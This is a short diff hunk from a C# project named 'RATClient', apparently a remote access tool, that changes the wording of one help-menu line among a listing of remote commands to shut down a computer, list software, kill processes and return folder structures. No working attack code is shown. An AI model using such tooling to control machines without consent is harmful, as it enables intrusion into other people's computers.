@@ -200,7 +200,7 @@ namespace RATClient
             Console.WriteLine("SHUTDOWN                 Shutdown The Computer");
             Console.WriteLine("SOFTWARE                 List Installed Software");
             Console.WriteLine("TASKKILL [path]          Kill A Running Process");
-            Console.WriteLine("TREE [path]              Return Folder Structure");
+            Console.WriteLine("TREE [path]              Return A Folder Structure");
         }
         static T DeserializeFromXml<T>(string xml)
         {
